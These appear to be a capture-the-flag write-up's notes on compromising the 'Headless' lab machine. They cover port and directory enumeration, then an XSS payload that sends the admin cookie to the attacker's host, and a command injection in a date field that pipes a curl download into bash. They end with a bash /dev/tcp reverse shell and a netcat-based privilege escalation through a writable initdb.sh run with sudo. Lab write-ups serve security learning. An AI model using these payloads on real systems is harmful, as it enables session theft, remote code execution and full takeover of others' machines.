Reconnaisance & Enumeration

nmap -p- --min-rate 10000 10.10.11.8

![[Headless image.png]]

nmap -p5000 -sC -sV -A 10.10.11.8

![[Headless image 1.png]]

![[Headless image 2.png]]

Directory

gobuster dir -u http://10.10.11.8:5000 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -s "200,301" -e -t 50 --status-codes ""

![[Headless image 3.png]]

Subdomain

wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.10.11.8:5000/ -H 'Host: FUZZ.10.10.11.8' -t 50 --hc 302

Nothing

![[Headless image 4.png]]

![[Headless image 5.png]]

Cookie Stealing

https://pswalia2u.medium.com/exploiting-xss-stealing-cookies-csrf-2325ec03136e

Script

==🔴\<script>====🔴var i=new Image(); i.src="http://10.10.14.====🔴120====🔴:800====🔴0====🔴/?====🔴c====🔴ookie="+btoa(document.cookie);====🔴\</script>==

I set The Script to User-Agent & message.

Burp Suite Intercept

![[Headless image 6.png]]

python3 -m http.server

![[Headless image 7.png]]

10.10.11.8 - - \[16/Apr/2024 23:14:39\] "GET /?cookie=aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= HTTP/1.1" 200 -

base64 decode cookie

echo aXNfYWRtaW49SW1Ga2JXbHVJZy5kbXpEa1pORW02Q0swb3lMMWZiTS1TblhwSDA= | base64 -d

![[Headless image 8.png]]

ImFkbWluIg.dmzDkZNEm6CK0oyL1fbM-SnXpH0

![[Headless image 9.png]]

![[Headless image 10.png]]

Create payload

![[Headless image 11.png]]

/bin/bash -c 'exec bash -i >& /dev/tcp/10.10.14.120/4444 0>&1'

netcat

nc -nlvp 4444

![[Headless image 12.png]]

Burp Suite

![[Headless image 13.png]]

date=2023-09-15;curl http://10.10.14.120:8000/payload.sh|bash

![[Headless image 14.png]]

Success

user flag

![[Headless image 15.png]]

![[Headless image 16.png]]

![[Headless image 17.png]]

/usr/bin/syscheck

https://medium.com/@adiamond186/usr-bin-syscheck-is-looking-for-the-initdb-sh-609cd006d913

Privilege Escalation

==🔴echo== ==🔴"nc -e /bin/sh 10.10.14.====🔴120== ==🔴5555====🔴"== > initdb.sh

![[Headless image 18.png]]

==🔴chmod== 777 initdb.sh

![[Headless image 19.png]]

nc -nlvp 5555

![[Headless image 20.png]]

sudo /usr/bin/syscheck

![[Headless image 21.png]]

root flag

![[Headless image 22.png]]